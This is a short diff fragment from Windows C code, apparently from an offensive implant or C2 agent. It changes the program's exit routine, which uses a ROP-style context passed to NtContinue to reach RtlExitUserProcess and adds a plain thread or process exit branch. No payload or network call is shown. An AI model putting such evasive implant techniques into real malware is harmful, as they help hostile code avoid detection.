         *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.RtlExitUserProcess );
 
     RopExit.ContextFlags = CONTEXT_FULL;
-    Instance.Syscall.NtContinue( &RopExit, FALSE );
+    Instance.Win32.NtContinue( &RopExit, FALSE );
+
+#else
+
+    // TODO: cleanup memory
+
+    if ( ExitMethod == 1 )
+        Instance.Win32.RtlExitUserThread( STATUS_SUCCESS );
+
+    else if ( ExitMethod == 2 )
+        Instance.Win32.RtlExitUserProcess( STATUS_SUCCESS );
+
+#endif
 }
